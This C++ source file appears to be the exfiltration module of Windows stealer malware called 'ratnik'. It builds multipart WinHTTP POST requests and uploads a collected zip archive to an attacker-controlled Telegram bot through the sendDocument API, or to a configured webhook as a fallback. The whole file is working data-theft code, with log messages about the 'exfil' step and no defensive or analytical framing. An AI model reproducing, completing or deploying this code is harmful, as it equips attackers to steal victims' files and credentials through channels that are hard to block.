#include "exfil.h"
#include "config.h"

static bool Crack(const std::wstring& url, std::wstring* host, std::wstring* path,
                  INTERNET_PORT* port, bool* https) {
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);
    wchar_t h[256] = L"", p[2048] = L"";
    uc.lpszHostName = h; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = p; uc.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc)) return false;
    *host = h;
    *path = p;
    *port = uc.nPort;
    *https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    return true;
}

bool HttpPostMultipart(const std::wstring& url, const fs::path& file, const std::string& caption,
                       const std::string& fieldFile, const std::map<std::string, std::string>& fields,
                       std::string* response) {
    std::wstring host, path;
    INTERNET_PORT port = 0;
    bool https = false;
    if (!Crack(url, &host, &path, &port, &https)) {
        Log("exfil: bad url");
        return false;
    }

    Bytes fileData = ReadAll(file);
    if (fileData.empty()) {
        Log("exfil: empty archive");
        return false;
    }

    std::string boundary = "----ratnik" + NowStamp();
    std::string body;
    for (auto& [k, v] : fields) {
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"" + k + "\"\r\n\r\n";
        body += v + "\r\n";
    }
    std::string fname = ToUtf8(file.filename().wstring());
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"" + fieldFile + "\"; filename=\"" + fname + "\"\r\n";
    body += "Content-Type: application/zip\r\n\r\n";
    body.append((const char*)fileData.data(), fileData.size());
    body += "\r\n--" + boundary + "--\r\n";

    HINTERNET s = WinHttpOpen(L"ratnik/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    HINTERNET c = WinHttpConnect(s, host.c_str(), port, 0);
    if (!c) { WinHttpCloseHandle(s); return false; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    bool ok = false;
    if (r) {
        std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" + ToWide(boundary) + L"\r\n";
        if (WinHttpSendRequest(r, hdr.c_str(), (DWORD)hdr.size(), (LPVOID)body.data(),
                               (DWORD)body.size(), (DWORD)body.size(), 0) &&
            WinHttpReceiveResponse(r, nullptr)) {
            ok = true;
            if (response) {
                DWORD avail = 0;
                do {
                    WinHttpQueryDataAvailable(r, &avail);
                    if (!avail) break;
                    std::string chunk(avail, 0);
                    DWORD rd = 0;
                    WinHttpReadData(r, chunk.data(), avail, &rd);
                    response->append(chunk.data(), rd);
                } while (avail > 0);
            }
        } else {
            Log("exfil: send failed %lu", GetLastError());
        }
        WinHttpCloseHandle(r);
    }
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    return ok;
}

bool Exfil(const fs::path& archive, std::string* response) {
    std::string token = TG_BOT_TOKEN, chat = TG_CHAT_ID, webhook = WEBHOOK_URL;
    if (!token.empty() && !chat.empty()) {
        std::wstring url = L"https://api.telegram.org/bot" + ToWide(token) + L"/sendDocument";
        std::map<std::string, std::string> fields = { { "chat_id", chat }, { "caption", "log" } };
        return HttpPostMultipart(url, archive, "log", "document", fields, response);
    }
    if (!webhook.empty()) {
        std::map<std::string, std::string> fields = { { "content", "log" } };
        return HttpPostMultipart(ToWide(webhook), archive, "log", "file", fields, response);
    }
    Log("exfil: no target configured, archive kept at %s", ToUtf8(archive.wstring()).c_str());
    return false;
}
